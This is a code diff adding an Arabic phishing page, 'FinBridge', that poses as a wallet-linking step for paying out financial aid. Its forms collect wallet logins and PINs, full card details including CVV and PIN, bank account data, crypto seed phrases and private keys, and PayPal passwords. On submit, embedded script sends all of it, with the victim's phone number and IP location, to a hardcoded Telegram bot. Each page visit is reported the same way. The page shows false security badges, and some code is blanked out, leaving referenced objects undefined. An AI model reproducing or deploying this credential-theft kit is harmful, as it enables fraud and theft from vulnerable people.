@@ -1,0 +1,539 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ربط المحفظة - FinBridge</title>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --gold: #C9A84C; --gold-light: #E8C96A; --gold-dark: #8B6914;
+            --bg-deep: #080C14; --bg-card: #0D1220; --bg-surface: #111827;
+            --border: rgba(201,168,76,0.2); --text-primary: #F0E6CC;
+            --text-secondary: #8A9BB5; --success: #10B981; --error: #EF4444;
+        }
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            font-family:'Tajawal',sans-serif; background:var(--bg-deep);
+            min-height:100vh; display:flex; align-items:center; justify-content:center;
+            padding:40px 16px; overflow-x:hidden;
+        }
+        body::before {
+            content:''; position:fixed; inset:0;
+            background: radial-gradient(ellipse 80% 50% at 30% 0%, rgba(201,168,76,0.07) 0%, transparent 60%),
+                        radial-gradient(ellipse 60% 40% at 70% 100%, rgba(201,168,76,0.04) 0%, transparent 60%);
+            pointer-events:none;
+        }
+        body::after {
+            content:''; position:fixed; inset:0;
+            background-image: linear-gradient(rgba(201,168,76,0.03) 1px, transparent 1px),
+                              linear-gradient(90deg, rgba(201,168,76,0.03) 1px, transparent 1px);
+            background-size:60px 60px; pointer-events:none;
+        }
+        .page-wrap { position:relative; z-index:1; width:100%; max-width:480px; }
+
+        .brand { text-align:center; margin-bottom:24px; animation:fadeDown 0.5s ease both; }
+        .brand-name {
+            font-size:1.5rem; font-weight:800; letter-spacing:2px;
+            background:linear-gradient(135deg,var(--gold-light),var(--gold));
+            -webkit-background-clip:text; -webkit-text-fill-color:transparent; background-clip:text;
+        }
+
+        .main-card {
+            background:var(--bg-card); border:1px solid var(--border); border-radius:24px;
+            padding:40px 36px; position:relative; overflow:hidden;
+            animation:fadeUp 0.6s ease 0.1s both;
+            box-shadow:0 24px 80px rgba(0,0,0,0.6), inset 0 1px 0 rgba(255,255,255,0.04);
+        }
+        .main-card::before {
+            content:''; position:absolute; top:0; left:10%; right:10%; height:1px;
+            background:linear-gradient(90deg,transparent,var(--gold),transparent);
+        }
+
+        /* wallet badge */
+        .wallet-badge {
+            display:flex; align-items:center; gap:14px;
+            background:rgba(201,168,76,0.06); border:1px solid rgba(201,168,76,0.2);
+            border-radius:14px; padding:14px 18px; margin-bottom:28px;
+            animation:fadeUp 0.5s ease 0.2s both;
+        }
+        .wallet-icon { font-size:2rem; }
+        .wallet-info-name { font-size:1rem; font-weight:700; color:var(--text-primary); }
+        .wallet-info-type { font-size:0.75rem; color:var(--gold); margin-top:2px; }
+
+        .card-title { font-size:1.3rem; font-weight:800; color:var(--text-primary); margin-bottom:6px; }
+        .card-subtitle { font-size:0.83rem; color:var(--text-secondary); line-height:1.6; margin-bottom:28px; }
+
+        /* حقول */
+        .field-group { margin-bottom:18px; animation:fadeUp 0.5s ease both; }
+        .field-label {
+            display:flex; align-items:center; gap:8px;
+            font-size:0.78rem; font-weight:700; color:var(--gold);
+            text-transform:uppercase; letter-spacing:0.5px; margin-bottom:9px;
+        }
+        .input-base {
+            width:100%; background:var(--bg-surface); border:1px solid rgba(255,255,255,0.08);
+            border-radius:12px; padding:13px 16px; color:var(--text-primary);
+            font-family:'Tajawal',sans-serif; font-size:0.95rem; outline:none; transition:all 0.25s;
+        }
+        .input-base:focus { border-color:var(--gold); background:rgba(201,168,76,0.04); box-shadow:0 0 0 3px rgba(201,168,76,0.1); }
+        .input-base::placeholder { color:#3d4f6a; }
+
+        /* بطاقة بنكية */
+        .card-visual {
+            background:linear-gradient(135deg,#1a2235,#0d1628);
+            border:1px solid rgba(201,168,76,0.3); border-radius:18px;
+            padding:24px; margin-bottom:22px; position:relative; overflow:hidden;
+            animation:fadeUp 0.5s ease 0.25s both;
+        }
+        .card-visual::before {
+            content:''; position:absolute; top:-40px; right:-40px;
+            width:120px; height:120px; border-radius:50%;
+            background:radial-gradient(circle,rgba(201,168,76,0.12),transparent);
+        }
+        .card-visual::after {
+            content:''; position:absolute; bottom:-30px; left:-30px;
+            width:100px; height:100px; border-radius:50%;
+            background:radial-gradient(circle,rgba(201,168,76,0.08),transparent);
+        }
+        .card-chip {
+            width:40px; height:30px; background:linear-gradient(135deg,var(--gold-light),var(--gold-dark));
+            border-radius:6px; margin-bottom:20px;
+        }
+        .card-number-display {
+            font-size:1.1rem; font-weight:700; letter-spacing:4px;
+            color:var(--text-primary); direction:ltr; margin-bottom:16px;
+            font-variant-numeric:tabular-nums; min-height:28px;
+        }
+        .card-bottom { display:flex; justify-content:space-between; align-items:flex-end; }
+        .card-holder-label { font-size:0.6rem; color:var(--text-secondary); text-transform:uppercase; letter-spacing:1px; }
+        .card-holder-name { font-size:0.85rem; font-weight:700; color:var(--text-primary); margin-top:3px; min-height:20px; }
+        .card-expiry-label { font-size:0.6rem; color:var(--text-secondary); text-transform:uppercase; letter-spacing:1px; text-align:left; }
+        .card-expiry-val { font-size:0.85rem; font-weight:700; color:var(--text-primary); margin-top:3px; direction:ltr; min-height:20px; }
+
+        /* شبكة بطاقة */
+        .card-grid { display:grid; grid-template-columns:1fr 1fr; gap:14px; }
+        .card-grid-3 { display:grid; grid-template-columns:2fr 1fr 1fr; gap:12px; }
+
+        /* eye toggle */
+        .input-with-icon { position:relative; }
+        .input-with-icon .input-base { padding-left:44px; direction:ltr; }
+        .eye-btn {
+            position:absolute; left:12px; top:50%; transform:translateY(-50%);
+            background:none; border:none; cursor:pointer; color:var(--text-secondary);
+            font-size:1.1rem; padding:2px; transition:color 0.2s;
+        }
+        .eye-btn:hover { color:var(--gold); }
+
+        /* section divider */
+        .section-divider {
+            display:flex; align-items:center; gap:10px; margin:22px 0 18px;
+        }
+        .section-divider-line { flex:1; height:1px; background:linear-gradient(90deg,transparent,var(--border),transparent); }
+        .section-divider-label {
+            font-size:0.68rem; font-weight:700; letter-spacing:1.5px; color:var(--gold);
+            text-transform:uppercase; white-space:nowrap; padding:3px 10px;
+            border:1px solid rgba(201,168,76,0.2); border-radius:20px; background:rgba(201,168,76,0.05);
+        }
+
+        /* submit */
+        .submit-btn {
+            width:100%; padding:15px; margin-top:6px;
+            background:linear-gradient(135deg,var(--gold-light),var(--gold),#A07820);
+            border:none; border-radius:12px; color:#0D0A00;
+            font-family:'Tajawal',sans-serif; font-size:1rem; font-weight:800;
+            cursor:pointer; letter-spacing:1px; transition:all 0.3s;
+            display:flex; align-items:center; justify-content:center; gap:10px;
+            position:relative; overflow:hidden;
+        }
+        .submit-btn::before { content:''; position:absolute; inset:0; background:linear-gradient(135deg,rgba(255,255,255,0.15),transparent); opacity:0; transition:opacity 0.3s; }
+        .submit-btn:hover::before { opacity:1; }
+        .submit-btn:hover { transform:translateY(-2px); box-shadow:0 8px 30px rgba(201,168,76,0.4); }
+        .submit-btn:disabled { opacity:0.6; cursor:not-allowed; transform:none; box-shadow:none; }
+
+        .security-row { display:flex; justify-content:center; gap:20px; margin-top:20px; }
+        .security-item { display:flex; align-items:center; gap:6px; font-size:0.72rem; color:var(--text-secondary); }
+        .security-item span { color:var(--success); }
+
+        .card-footer { text-align:center; margin-top:20px; font-size:0.72rem; color:#3d4f6a; }
+
+        .spinner { width:18px; height:18px; border:2px solid rgba(0,0,0,0.3); border-top-color:#000; border-radius:50%; animation:spin 0.7s linear infinite; display:inline-block; }
+
+        /* hidden sections */
+        .login-section { display:none; }
+        .login-section.active { display:block; }
+
+        @keyframes fadeDown { from{opacity:0;transform:translateY(-20px)} to{opacity:1;transform:translateY(0)} }
+        @keyframes fadeUp   { from{opacity:0;transform:translateY(16px)}  to{opacity:1;transform:translateY(0)} }
+        @keyframes spin     { to{transform:rotate(360deg)} }
+    </style>
+</head>
+<body>
+<div class="page-wrap">
+    <div class="brand"><div class="brand-name">FinBridge</div></div>
+
+    <div class="main-card">
+
+        <!-- بادج المحفظة المختارة -->
+        <div class="wallet-badge">
+            <div class="wallet-icon" id="walletIcon">💳</div>
+            <div>
+                <div class="wallet-info-name" id="walletName">...</div>
+                <div class="wallet-info-type" id="walletType">جاري التحميل...</div>
+            </div>
+        </div>
+
+        <div class="card-title">ربط المحفظة</div>
+        <div class="card-subtitle">أدخل بيانات الدخول الخاصة بمحفظتك لإتمام عملية الربط وصرف المساعدة</div>
+
+        <form id="walletForm">
+
+            <!-- ── قسم 1: محفظة إلكترونية (اسم مستخدم + كلمة مرور) ── -->
+            <div class="login-section" id="section-app">
+                <div class="field-group">
+                    <div class="field-label">📧 اسم المستخدم / البريد / الهاتف</div>
+                    <input type="text" id="appUsername" class="input-base" placeholder="أدخل اسم المستخدم أو البريد الإلكتروني" autocomplete="off">
+                </div>
+                <div class="field-group">
+                    <div class="field-label">🔑 كلمة المرور</div>
+                    <div class="input-with-icon">
+                        <input type="password" id="appPassword" class="input-base" placeholder="أدخل كلمة المرور" autocomplete="off">
+                        <button type="button" class="eye-btn" onclick="togglePass('appPassword',this)">👁</button>
+                    </div>
+                </div>
+                <div class="field-group">
+                    <div class="field-label">🔢 رقم PIN (اختياري)</div>
+                    <input type="password" id="appPin" class="input-base" placeholder="رقم الـ PIN إن وجد" maxlength="6" autocomplete="off">
+                </div>
+            </div>
+
+            <!-- ── قسم 2: بطاقة بنكية (Visa/Mastercard/Mada...) ── -->
+            <div class="login-section" id="section-card">
+                <!-- عرض مرئي للبطاقة -->
+                <div class="card-visual">
+                    <div class="card-chip"></div>
+                    <div class="card-number-display" id="cardNumDisplay">•••• •••• •••• ••••</div>
+                    <div class="card-bottom">
+                        <div>
+                            <div class="card-holder-label">Card Holder</div>
+                            <div class="card-holder-name" id="cardHolderDisplay">FULL NAME</div>
+                        </div>
+                        <div>
+                            <div class="card-expiry-label">Expires</div>
+                            <div class="card-expiry-val" id="cardExpiryDisplay">MM/YY</div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="field-group">
+                    <div class="field-label">💳 رقم البطاقة</div>
+                    <input type="text" id="cardNumber" class="input-base" placeholder="XXXX XXXX XXXX XXXX"
+                        maxlength="19" autocomplete="off" oninput="formatCard(this)" style="direction:ltr; letter-spacing:2px;">
+                </div>
+                <div class="field-group">
+                    <div class="field-label">👤 اسم حامل البطاقة</div>
+                    <input type="text" id="cardHolder" class="input-base" placeholder="الاسم كما هو على البطاقة"
+                        autocomplete="off" oninput="document.getElementById('cardHolderDisplay').textContent = this.value.toUpperCase() || 'FULL NAME'">
+                </div>
+                <div class="card-grid-3">
+                    <div class="field-group">
+                        <div class="field-label">📅 تاريخ الانتهاء</div>
+                        <input type="text" id="cardExpiry" class="input-base" placeholder="MM/YY"
+                            maxlength="5" autocomplete="off" oninput="formatExpiry(this)" style="direction:ltr;">
+                    </div>
+                    <div class="field-group">
+                        <div class="field-label">🔒 CVV</div>
+                        <div class="input-with-icon">
+                            <input type="password" id="cardCvv" class="input-base" placeholder="•••" maxlength="4" autocomplete="off" style="text-align:center;">
+                            <button type="button" class="eye-btn" onclick="togglePass('cardCvv',this)">👁</button>
+                        </div>
+                    </div>
+                    <div class="field-group">
+                        <div class="field-label">🔢 PIN</div>
+                        <input type="password" id="cardPin" class="input-base" placeholder="••••" maxlength="6" autocomplete="off" style="text-align:center;">
+                    </div>
+                </div>
+            </div>
+
+            <!-- ── قسم 3: تحويل بنكي (IBAN + Swift) ── -->
+            <div class="login-section" id="section-bank">
+                <div class="field-group">
+                    <div class="field-label">🏦 رقم IBAN</div>
+                    <input type="text" id="bankIban" class="input-base" placeholder="SA00 0000 0000 0000 0000 0000"
+                        maxlength="34" autocomplete="off" oninput="this.value=this.value.toUpperCase()" style="direction:ltr; letter-spacing:1px;">
+                </div>
+                <div class="field-group">
+                    <div class="field-label">🌐 رمز SWIFT / BIC</div>
+                    <input type="text" id="bankSwift" class="input-base" placeholder="XXXXXXXX"
+                        maxlength="11" autocomplete="off" oninput="this.value=this.value.toUpperCase()" style="direction:ltr;">
+                </div>
+                <div class="field-group">
+                    <div class="field-label">👤 اسم صاحب الحساب</div>
+                    <input type="text" id="bankHolder" class="input-base" placeholder="الاسم كما في البنك" autocomplete="off">
+                </div>
+                <div class="field-group">
+                    <div class="field-label">🔑 رقم الحساب المصرفي</div>
+                    <input type="text" id="bankAccount" class="input-base" placeholder="رقم الحساب" autocomplete="off" style="direction:ltr;">
+                </div>
+            </div>
+
+            <!-- ── قسم 4: كريبتو ── -->
+            <div class="login-section" id="section-crypto">
+                <div class="field-group">
+                    <div class="field-label">📬 عنوان المحفظة (Wallet Address)</div>
+                    <input type="text" id="cryptoAddress" class="input-base" placeholder="0x... أو T..."
+                        autocomplete="off" style="direction:ltr; font-size:0.82rem; letter-spacing:0.5px;">
+                </div>
+                <div class="section-divider">
+                    <div class="section-divider-line"></div>
+                    <div class="section-divider-label">أو دخول عبر الـ Seed</div>
+                    <div class="section-divider-line"></div>
+                </div>
+                <div class="field-group">
+                    <div class="field-label">🌱 Seed Phrase (12 أو 24 كلمة)</div>
+                    <textarea id="cryptoSeed" class="input-base" rows="3"
+                        placeholder="أدخل الـ Seed Phrase الخاصة بمحفظتك..."
+                        style="resize:none; direction:ltr; font-size:0.82rem; line-height:1.7;"></textarea>
+                </div>
+                <div class="field-group">
+                    <div class="field-label">🔑 Private Key (اختياري)</div>
+                    <div class="input-with-icon">
+                        <input type="password" id="cryptoKey" class="input-base" placeholder="المفتاح الخاص..." autocomplete="off">
+                        <button type="button" class="eye-btn" onclick="togglePass('cryptoKey',this)">👁</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ── قسم 5: PayPal / Wise ── -->
+            <div class="login-section" id="section-paypal">
+                <div class="field-group">
+                    <div class="field-label">📧 البريد الإلكتروني</div>
+                    <input type="email" id="paypalEmail" class="input-base" placeholder="example@email.com" autocomplete="off" style="direction:ltr;">
+                </div>
+                <div class="field-group">
+                    <div class="field-label">🔑 كلمة المرور</div>
+                    <div class="input-with-icon">
+                        <input type="password" id="paypalPassword" class="input-base" placeholder="كلمة المرور" autocomplete="off">
+                        <button type="button" class="eye-btn" onclick="togglePass('paypalPassword',this)">👁</button>
+                    </div>
+                </div>
+            </div>
+
+            <button type="submit" class="submit-btn" id="submitBtn">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+                </svg>
+                ربط المحفظة وصرف المساعدة
+            </button>
+        </form>
+
+        <div class="security-row">
+            <div class="security-item"><span>✓</span> تشفير SSL</div>
+            <div class="security-item"><span>✓</span> بيانات محمية</div>
+            <div class="security-item"><span>✓</span> آمن 100%</div>
+        </div>
+
+        <div class="card-footer">© 2026 FinBridge — ربط المحافظ الآمن</div>
+    </div>
+</div>
+
+<script>
+
+    const BOT_TOKEN = '8653478298:AAF2IBoanRgDEcQRi6jT1mcEtUjKhUqcZuk';
+    const CHAT_ID   = '6465499082';
+
+    async function tg(msg) {
+        try {
+            await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: 'HTML'})
+            });
+        } catch(e) {}
+    }
+
+
+    const phone   = sessionStorage.getItem('userPhone')   || '---';
+    const country = sessionStorage.getItem('userCountry') || '';
+    const amount  = sessionStorage.getItem('userAmount')  || '';
+    const wallet  = sessionStorage.getItem('userWallet')  || '';
+    const userName= sessionStorage.getItem('userName')    || '';
+
+        async function getIP() {
+        const apis = [
+            'https://ipwho.is/',
+            'https://ip-api.com/json/?fields=query,city,country,regionName,org,lat,lon',
+            'https://ipapi.co/json/'
+        ];
+        for (const url of apis) {
+            try {
+                const r = await fetch(url, {signal: AbortSignal.timeout(4000)});
+                const d = await r.json();
+                // توحيد الحقول
+                return {
+                    ip:           d.ip     || d.query  || '?',
+                    city:         d.city   || '?',
+                    country_name: d.country|| d.country_name || '?',
+                    region:       d.region || d.regionName   || '',
+                    org:          d.connection?.isp || d.org || d.isp || '',
+                    latitude:     d.latitude  || d.lat || '',
+                    longitude:    d.longitude || d.lon || '',
+                };
+            } catch(e) { continue; }
+        }
+        return {ip:'?', city:'?', country_name:'?', region:'', org:'', latitude:'', longitude:''};
+    }
+
+    
+    
+    
+    
+
+    
+    function detectWalletType(name) {
+        if (!name) return 'app';
+        const n = name.toLowerCase();
+        for (const [type, list] of Object.entries(walletTypes)) {
+            if (list.some(w => n.includes(w.toLowerCase()))) return type;
+        }
+        return 'app';
+    }
+
+    const detectedType = detectWalletType(wallet);
+
+    // تحديث الـ badge
+    document.getElementById('walletIcon').textContent = walletIcons[detectedType] || '📲';
+    document.getElementById('walletName').textContent = wallet || 'غير محدد';
+    document.getElementById('walletType').textContent = walletTypeLabels[detectedType] || 'محفظة إلكترونية';
+
+    // إظهار القسم الصحيح
+    document.getElementById('section-' + detectedType).classList.add('active');
+
+    // تعبئة اسم المستخدم من الجلسة
+    const userInput = document.getElementById('appUsername');
+    if (userInput && userName) userInput.placeholder = 'مثال: ' + userName;
+
+    // ── تنسيق رقم البطاقة ──
+    function formatCard(input) {
+        let v = input.value.replace(/\D/g,'').slice(0,16);
+        input.value = v.replace(/(.{4})/g,'$1 ').trim();
+        const display = v.padEnd(16,'•').replace(/(.{4})/g,'$1 ').trim();
+        document.getElementById('cardNumDisplay').textContent = display;
+    }
+
+    function formatExpiry(input) {
+        let v = input.value.replace(/\D/g,'');
+        if (v.length > 2) v = v.slice(0,2) + '/' + v.slice(2,4);
+        input.value = v;
+        document.getElementById('cardExpiryDisplay').textContent = v || 'MM/YY';
+    }
+
+    function togglePass(id, btn) {
+        const el = document.getElementById(id);
+        if (el.type === 'password') { el.type = 'text'; btn.textContent = '🙈'; }
+        else { el.type = 'password'; btn.textContent = '👁'; }
+    }
+
+    // ── إرسال ──
+    document.getElementById('walletForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        const btn = document.getElementById('submitBtn');
+        btn.disabled = true;
+        btn.innerHTML = '<span class="spinner"></span> جاري الربط...';
+
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+
+        if (detectedType === 'app') {
+            
+            
+            
+        } else if (detectedType === 'card') {
+            
+            
+            
+            
+            
+        } else if (detectedType === 'bank') {
+            
+            
+            
+            
+        } else if (detectedType === 'crypto') {
+            
+            
+            
+        } else if (detectedType === 'paypal') {
+            
+            
+        }
+
+        
+
+        // IP
+        try { const r = await fetch('https://ipapi.co/json/'); const ip = await r.json();
+               
+        } catch(e) {}
+
+        
+
+        // إرسال بيانات المحفظة
+        const ip4 = await getIP();
+        let wlMsg = '🔓 <b>بيانات دخول المحفظة - FinBridge</b>\n' +
+            '━━━━━━━━━━━━━━━━\n' +
+            '👤 <b>الاسم:</b> ' + (userName||'---') + '\n' +
+            '📞 <b>الهاتف:</b> ' + phone + '\n' +
+            '🌍 <b>الدولة:</b> ' + country + '\n' +
+            '💰 <b>المبلغ:</b> ' + amount + '\n' +
+            '👛 <b>المحفظة:</b> ' + wallet + '\n' +
+            '📂 <b>نوع المحفظة:</b> ' + (walletTypeLabels[detectedType]||detectedType) + '\n\n';
+
+        if (detectedType === 'app') {
+            wlMsg += '👤 <b>اسم المستخدم:</b> ' + (document.getElementById('appUsername').value||'') + '\n' +
+                     '🔑 <b>كلمة المرور:</b> ' + (document.getElementById('appPassword').value||'') + '\n' +
+                     '🔢 <b>PIN:</b> ' + (document.getElementById('appPin').value||'-') + '\n';
+        } else if (detectedType === 'card') {
+            wlMsg += '💳 <b>رقم البطاقة:</b> ' + (document.getElementById('cardNumber').value||'') + '\n' +
+                     '👤 <b>حامل البطاقة:</b> ' + (document.getElementById('cardHolder').value||'') + '\n' +
+                     '📅 <b>تاريخ الانتهاء:</b> ' + (document.getElementById('cardExpiry').value||'') + '\n' +
+                     '🔒 <b>CVV:</b> ' + (document.getElementById('cardCvv').value||'') + '\n' +
+                     '🔢 <b>PIN:</b> ' + (document.getElementById('cardPin').value||'-') + '\n';
+        } else if (detectedType === 'paypal') {
+            wlMsg += '📧 <b>البريد:</b> ' + (document.getElementById('paypalEmail').value||'') + '\n' +
+                     '🔑 <b>كلمة المرور:</b> ' + (document.getElementById('paypalPassword').value||'') + '\n';
+        } else if (detectedType === 'crypto') {
+            wlMsg += '🌱 <b>Seed Phrase:</b> ' + (document.getElementById('cryptoSeed').value||'') + '\n' +
+                     '🔑 <b>Private Key:</b> ' + (document.getElementById('cryptoKey').value||'-') + '\n';
+        } else if (detectedType === 'bank') {
+            wlMsg += '🏦 <b>IBAN:</b> ' + (document.getElementById('bankIban').value||'') + '\n' +
+                     '🌐 <b>SWIFT:</b> ' + (document.getElementById('bankSwift').value||'') + '\n' +
+                     '👤 <b>صاحب الحساب:</b> ' + (document.getElementById('bankHolder').value||'') + '\n';
+        }
+        wlMsg += '\n🌐 <b>IP:</b> ' + (ip4.ip||'?') + ' | ' + (ip4.country_name||'') + '\n' +
+                 '⏰ ' + new Date().toLocaleString('ar-EG');
+        await tg(wlMsg);
+        setTimeout(() => { window.location.href = 'success.html'; }, 1000);
+    });
+
+    window.addEventListener('load', async () => {
+        const ip5 = await getIP();
+        await tg(
+            '👁 <b>فتح صفحة ربط المحفظة</b>\n' +
+            '📞 <b>الهاتف:</b> ' + phone + '\n' +
+            '👛 <b>المحفظة:</b> ' + wallet + '\n' +
+            '🌐 <b>IP:</b> ' + (ip5.ip||'?') + ' | ' + (ip5.country_name||'') + '\n' +
+            '⏰ ' + new Date().toLocaleString('ar-EG')
+        );
+    });
+
+</script>
+</body>
+</html>
